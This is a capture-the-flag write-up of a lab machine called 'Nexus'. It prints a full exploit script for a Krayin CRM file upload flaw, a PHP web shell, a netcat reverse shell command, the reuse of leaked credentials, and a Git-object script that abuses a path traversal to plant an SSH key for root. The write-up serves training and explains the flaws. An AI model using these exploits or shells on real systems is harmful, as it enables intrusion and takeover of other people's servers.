# Nexus

![alt text](images/logo.png)

**Difficulty:** Easy  

**OS:** Linux

**---**

**## Summary**

1. Enumerate the target

2. Discover the `git.nexus.htb` and `billing.nexus.htb` virtual hosts

3. Find leaked credentials in the public Gitea repository

4. Log in to Krayin CRM and exploit `CVE-2026-38526`

5. Upload a PHP web shell and obtain a reverse shell

6. Recover the `jones` credentials and log in via `SSH`

7. Review the Gitea template synchronization service and identify a path traversal

8. Craft malicious Git objects to write our SSH key into `/root/.ssh/authorized_keys`

9. Gain root access

**---**

**## Solve**

**### Enumeration**

Start with a full TCP scan:

```bash

nmap -sV -sC -p- -A -T5 10.129.99.76

```

- `-sV` : Detect service versions

- `-sC` : Run default NSE scripts

- `-p-` : Scan all 65535 TCP ports

- `-A` : Enable aggressive detection

- `-T5` : Use the fastest Nmap timing profile

```text

PORT   STATE SERVICE VERSION

22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)

80/tcp open  http    nginx 1.24.0 (Ubuntu)

|_http-title: Did not follow redirect to http://nexus.htb/

|_http-server-header: nginx/1.24.0 (Ubuntu)

```

The interesting services are:

- `22` -> SSH

- `80` -> Web application

According to the first nmap output we will add `nexus.htb` to our /etc/host:

```bash

echo "10.129.99.76 nexus.htb" | sudo tee -a /etc/hosts

```

**---**

**### Web Enumeration**

The web application is company app hosting infos, news and an application part. At first look there is not mutch to see on **nexus.htb**. The only information that we can get is two email:

- j.matthew@nexus.htb

- careers@nexus.htb

The next step would be to fuzz vhost in order to find other application:

```bash

ffuf 
  -u http://10.129.99.76/ 
  -H 'Host: FUZZ.nexus.htb' 
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt 
  -mc all 
  -ac 
  -t 50

```

The fuzzing return two news subdomain:

```text

git      [Status: 200, Size: 14472, Words: 1195, Lines: 242]

billing  [Status: 302, Size: 390, Words: 60, Lines: 12]

```

We now need to add both to our `/etc/hosts`:

```bash

echo "10.129.99.76 git.nexus.htb billing.nexus.htb" | sudo tee -a /etc/hosts

```

**---**

**### Gitea**

Accessing to `http://git.nexus.htb` we discover a Gitea application.

If we scroll down we can find the version:

```text

Powered by Gitea

Version: 1.26.0

```

There is also a repository named:

```text

admin/krayin-docker-setup

```

Inside this repository there is a file named `.env` that contains the variables used for Docker.

Inside it we can find a password:

```text

DB_PASSWORD=N27xh!!2ucY04

```

**---**

**### Krayin**

If we check `http://billing.nexus.htb` we find an application:

```text

Powered by Krayin

```

So far we've got an email and a password.

We can use both to log in to Krayin:

```text

username: j.matthew@nexus.htb
password: N27xh!!2ucY04

```

After some research we can see that Krayin is vulnerable to [CVE-2026-38526](https://nvd.nist.gov/vuln/detail/cve-2026-38526).

> An authenticated arbitrary file upload vulnerability in the /admin/tinymce/upload endpoint of Webkul Krayin CRM v2.2.x allows attackers to execute arbitrary code via uploading a crafted PHP file.

To identify the exact version of Krayin, we can click the profile icon on the top-right of the screen.

The target is running:

```text

Krayin 2.2.0

```

![alt text](images/image.png)

We can now use the following [PoC](https://www.exploit-db.com/exploits/52629):

<details>
<summary><strong>poc.py</strong></summary>

```python
# Exploit Title: Krayin CRM v2.2.x - Authenticated Remote Code Execution
# Date: 07/05/2026
# Exploit Author: Diamorphine
# Vendor Homepage: https://krayincrm.com
# Software Link: https://github.com/krayin/laravel-crm
# Version: 2.2.x
# Tested on: Debian
# CVE: CVE-2026-38526

import asyncio
import httpx
from urllib.parse import *
import argparse
from bs4 import BeautifulSoup
import json


async def main(url, user, password, file):
    async with httpx.AsyncClient(verify=False) as client:
        url_login = urljoin(url, "/admin/login")
        upload_url = urljoin(url, "/admin/tinymce/upload")

        get_tokens = await client.get(url=url_login)
        soup = BeautifulSoup(get_tokens.text, "html.parser")
        _token = soup.find("input").get("value")

        login_data = {
            "_token": _token,
            "email": user,
            "password": password
        }

        login_r = await client.post(url=url_login, data=login_data)
        xsrf_token = login_r.cookies.get("XSRF-TOKEN")

        headers = {
            "X-XSRF-TOKEN": unquote(xsrf_token)
        }

        with open(file, "rb") as o_file:
            r = await client.post(
                url=upload_url,
                files={
                    "file": (
                        o_file.name,
                        o_file,
                        "image/jpeg"
                    )
                },
                headers=headers
            )

            if r.status_code == 200:
                exploit_url = r.json().get("location")
                print(
                    f"[+] File uploaded successfully.n"
                    f"Path to file: {exploit_url}"
                )
            else:
                print("[-] File not uploaded.")


parser = argparse.ArgumentParser(
    description="Exploit for CVE-2026-38526, authenticated file upload."
)

parser.add_argument(
    "-t",
    "--target",
    required=True,
    help="Target url. E.g. http://127.0.0.1"
)

parser.add_argument(
    "-u",
    "--user",
    required=True,
    help="Email."
)

parser.add_argument(
    "-p",
    "--password",
    required=True,
    help="Password."
)

parser.add_argument(
    "-f",
    "--file",
    required=True,
    help="File to upload (/home/user/shell.php)."
)

args = parser.parse_args()

if __name__ == "__main__":
    asyncio.run(
        main(
            args.target,
            args.user,
            args.password,
            args.file
        )
    )
```

</details>

<details>
<summary><strong>shell.php</strong></summary>

```php
<html>
<body>

<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
    <input type="TEXT" name="cmd" id="cmd" size="80">
    <input type="SUBMIT" value="Execute">
</form>

<pre>
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
</pre>

</body>

<script>
document.getElementById("cmd").focus();
</script>

</html>
```

</details>

Run the exploit:

```bash

python3 poc.py 
-t http://billing.nexus.htb 
-u 'j.matthew@nexus.htb' 
-p 'N27xh!!2ucY04' 
-f shell.php

```

Output:

```text

[+] File uploaded successfully.
Path to file: http://billing.nexus.htb/storage/tinymce/fb73fd7ae2b44825085325355ee415aa.php

```

From here, using a simple reverse shell, we can gain access to the remote host.

On our host:

```bash

nc -nlvp 4444

```

And on the web shell:

```bash

busybox nc 10.10.14.203 4444 -e sh

```

We can then upgrade our shell:

```bash

python3 -c 'import pty; pty.spawn("/bin/bash")'

CTRL + Z

stty raw -echo && fg

```

- `python3 -c 'import pty; pty.spawn("/bin/bash")'` : Spawns a Bash shell inside a pseudo-terminal.

- `Ctrl+Z` : Suspends the current reverse shell and sends it to the background.

- `stty raw -echo && fg` : Puts the local terminal in raw mode, disables local echo, and brings the reverse shell back to the foreground.

**---**

**### Pivot**

From there we can upload [linpeas.sh](https://github.com/peass-ng/PEASS-ng/tree/master) to get more information.

There is one password found using LinPEAS inside:

```text

/var/www/krayin/.env

```

```text

DB_DATABASE=krayin
DB_USERNAME=krayin
DB_PASSWORD=y27xb3ha!!74GbR

```

We can also read `/etc/passwd` to identify other users:

```bash

cat /etc/passwd

```

Relevant users:

```text

git:x:111:112:Git Version Control,,,:/home/git:/bin/bash
jones:x:1000:1000:,,,:/home/jones:/bin/bash
root:x:0:0:root:/root:/bin/bash

```

We can then reuse the recovered credentials to log in as `jones` over SSH.

```bash

ssh jones@nexus.htb

```

**---**

**### Privilege Escalation**

During the previous enumeration, `linpeas` reports an interesting systemd timer:

```text

╔══════════╣ System timers (T1053.003)

NEXT                            LEFT LAST                             PASSED UNIT                         ACTIVATES
Thu 2026-09-10 21:39:09 UTC     19s Thu 2026-09-10 21:38:09 UTC      40s ago gitea-template-sync.timer     gitea-template-sync.service

```

The interesting timer is:

```text

gitea-template-sync.timer

```

It runs regularly, so the next step is to inspect the script used by the service:

```bash

cat /etc/gitea/template-sync.py

```

The interesting part is the way paths from the Git repository are handled.

The script first obtains every blob path from:

```python

result = subprocess.run(
    GIT + ['ls-tree', '-r', 'HEAD'],
    cwd=bare_path,
    capture_output=True,
    text=True,
    timeout=10
)

```

The returned path is stored directly in `filepath`:

```python

meta, filepath = parts

if objtype == 'blob':
    entries.append((mode, objhash, filepath))

```

Later, that untrusted path is appended to the staging directory:

```python

target = os.path.join(stage_path, filepath)

```

and finally written to disk:

```python

os.makedirs(target_dir, exist_ok=True)

with open(target, 'wb') as f:
    f.write(cat_result.stdout)

```

There is no check to ensure that the final destination remains inside:

```text

/home/git/template-staging/<owner>/<repo>/

```

Therefore, if a Git tree contains a path such as:

```text

../../../../../root/.ssh/authorized_keys

```

the filesystem interprets the `..` components when the file is created, allowing the write to escape the staging directory.

A normal Git working tree does not let us simply create files or directories named `..`, so we need to manually create the raw Git objects.

First, log in to Gitea as `jones`.

Create a repository named:

```text

rce

```

Mark it as:

```text

Make repository a template

```

and add a small `README.md`.

Clone the repository locally:

```bash

git clone http://jones@git.nexus.htb/jones/rce.git

cd rce

```

Generate an SSH key pair:

```bash

ssh-keygen -t ed25519 -f /tmp/.k -N ''

```

This creates:

```text

/tmp/.k
/tmp/.k.pub

```

The public key will be written into root's `authorized_keys`.

We can now use the following script to manually construct the malicious Git tree:

<details>
<summary><strong>poc.py</strong></summary>

```python
#!/usr/bin/env python3

import hashlib
import zlib
import os
import subprocess
import sys
import time


def write_obj(data, t):
    header = ("%s %d" % (t, len(data))).encode() + b"x00"
    raw = header + data

    sha = hashlib.sha1(raw).hexdigest()

    obj_dir = os.path.join(".git", "objects", sha[:2])
    os.makedirs(obj_dir, exist_ok=True)

    obj_path = os.path.join(obj_dir, sha[2:])

    if not os.path.exists(obj_path):
        with open(obj_path, "wb") as f:
            f.write(zlib.compress(raw))

    return sha


def entry(mode, name, sha):
    return (
        ("%s %s" % (mode, name)).encode()
        + b"x00"
        + bytes.fromhex(sha)
    )


if not os.path.isdir(".git"):
    print("Run inside git repo")
    sys.exit(1)


result = subprocess.run(
    ["cat", "/tmp/.k.pub"],
    capture_output=True,
    text=True
)

if result.returncode != 0:
    print("ssh-keygen -t ed25519 -f /tmp/.k -N ''")
    sys.exit(1)


key = result.stdout.strip() + "n"

blob = write_obj(key.encode(), "blob")

readme = write_obj(
    b"# Templaten",
    "blob"
)

ssh_tree = write_obj(
    entry(
        "100644",
        "authorized_keys",
        blob
    ),
    "tree"
)

current = write_obj(
    entry(
        "40000",
        ".ssh",
        ssh_tree
    ),
    "tree"
)

first = write_obj(
    entry(
        "40000",
        "root",
        current
    ),
    "tree"
)

for _ in range(4):
    first = write_obj(
        entry(
            "40000",
            "..",
            first
        ),
        "tree"
    )

root = write_obj(
    entry(
        "100644",
        "README.md",
        readme
    )
    +
    entry(
        "40000",
        "..",
        first
    ),
    "tree"
)

timestamp = int(time.time())

commit = (
    "tree %sn"
    "author x <x@x> %d +0000n"
    "committer x <x@x> %d +0000n"
    "n"
    "initn"
) % (
    root,
    timestamp,
    timestamp
)

commit_sha = write_obj(
    commit.encode(),
    "commit"
)

os.makedirs(
    os.path.join(
        ".git",
        "refs",
        "heads"
    ),
    exist_ok=True
)

with open(
    os.path.join(
        ".git",
        "refs",
        "heads",
        "main"
    ),
    "w"
) as f:
    f.write(commit_sha + "n")

print("Done: " + commit_sha)
```

</details>

Run the PoC from inside the cloned repository:

```bash

python3 poc.py

```

The script manually creates the following malicious path inside the Git tree:

```text

../../../../../root/.ssh/authorized_keys

```

It then creates a commit pointing to that tree and updates the local `main` reference.

Push the crafted commit to Gitea:

```bash

git push origin main --force

```

Because the repository is marked as a template, the synchronization timer eventually processes it.

The vulnerable script effectively works with a path equivalent to:

```text

/home/git/template-staging/jones/rce/
+
../../../../../root/.ssh/authorized_keys

```

The `..` components escape the staging directory and reach:

```text

/root/.ssh/authorized_keys

```

The blob stored at this location contains our `/tmp/.k.pub` public key.

After the synchronization timer has run, connect using the corresponding private key:

```bash

ssh -i /tmp/.k root@nexus.htb

```

We now have a root shell.

Finally:

```bash

cat /root/root.txt

```

**---**

**## Notes**

**### CVE-2026-38526 - Krayin CRM**

`CVE-2026-38526` is an authenticated unrestricted file upload vulnerability affecting Webkul Krayin CRM 2.2.x.

The vulnerable endpoint is:

```text

POST /admin/tinymce/upload

```

This endpoint is supposed to handle media uploaded through TinyMCE.

However, the application does not correctly validate the uploaded file type.

In our case, we upload:

```text

shell.php

```

while declaring its MIME type as:

```text

image/jpeg

```

The application accepts the upload and keeps the `.php` extension.

The file is then stored inside a web-accessible directory:

```text

/storage/tinymce/<random>.php

```

When we access the uploaded file through HTTP, the web server executes the PHP code.

The attack flow is:

```text

Authenticated user
        ↓
Upload shell.php
        ↓
Weak file type validation
        ↓
PHP file stored in web directory
        ↓
Access the uploaded file
        ↓
PHP execution
        ↓
Remote Code Execution

```

The vulnerability is classified as:

```text

CWE-434 - Unrestricted Upload of File with Dangerous Type

```

In this box, the CVE is only used to obtain the initial foothold.

It is unrelated to the final privilege escalation.

**---**

**### Code Review - template-sync.py**

The privilege escalation is caused by a custom vulnerability inside:

```text

/etc/gitea/template-sync.py

```

It is not a public Gitea CVE.

A simple way to review the vulnerable code is to follow attacker-controlled data from its source to the dangerous operation.

The source is:

```bash

git ls-tree -r HEAD

```

The script parses the output and stores the path inside:

```python

filepath

```

Because we control the Git repository, we also control the value of `filepath`.

The script then performs:

```python

target = os.path.join(stage_path, filepath)

```

There is no validation to ensure the resulting path stays inside:

```text

/home/git/template-staging/

```

For example, there is no use of:

```python

os.path.realpath()
os.path.abspath()
os.path.commonpath()

```

and no explicit rejection of:

```text

..

```

The resulting path is then directly passed to:

```python

with open(target, 'wb') as f:
    f.write(cat_result.stdout)

```

This gives us the following flow:

```text

Git repository
      ↓
git ls-tree
      ↓
filepath
      ↓
No path validation
      ↓
os.path.join()
      ↓
open(target, "wb")
      ↓
Path Traversal
      ↓
Arbitrary File Write

```

The important point is that `os.path.join()` does not sanitize the path.

For example:

```python

os.path.join(
    "/home/git/template-staging/jones/rce",
    "../../../../../root/.ssh/authorized_keys"
)

```

still produces a path containing the traversal components.

When `open()` accesses the path, the operating system interprets the `..` components.

This allows the write to escape the intended staging directory.

Normally, Git prevents us from creating files or directories named:

```text

..

```

through normal working-tree operations.

For that reason, the exploit manually creates the internal Git objects:

```text

blob
tree
commit

```

and writes them directly inside:

```text

.git/objects/

```

This is why the exploit contains functions such as:

```python

write_obj(...)
entry(...)

```

instead of simply using:

```bash

git add .
git commit

```

The vulnerability can therefore be summarized as:

```text

Crafted Git Tree
        ↓
Path containing ../../../../../
        ↓
template-sync.py trusts filepath
        ↓
Arbitrary File Write
        ↓
/root/.ssh/authorized_keys
        ↓
SSH as root

```